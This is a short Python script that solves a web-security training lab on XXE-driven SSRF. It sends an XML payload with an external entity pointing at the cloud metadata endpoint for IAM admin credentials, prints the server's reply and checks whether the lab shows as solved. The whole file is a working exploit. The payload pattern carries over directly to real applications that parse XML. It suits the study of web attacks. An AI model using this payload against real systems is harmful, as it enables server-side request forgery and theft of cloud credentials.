import requests
import argparse

parser = argparse.ArgumentParser(description='Solves the following Lab: Exploiting XXE to perform SSRF attacks')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

XHEADER = '<?xml version="1.0" encoding="UTF-8"?>' 
dtd = '<!DOCTYPE xxe [ <!ENTITY xxei SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin" > ]>'
xxe = '<stockCheck><productId>&xxei;</productId><storeId>1</storeId></stockCheck>'

r = requests.post("https://" + lab.id + ".web-security-academy.net/product/stock", data=f"{XHEADER}{dtd}{xxe}")
print(r.text)

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")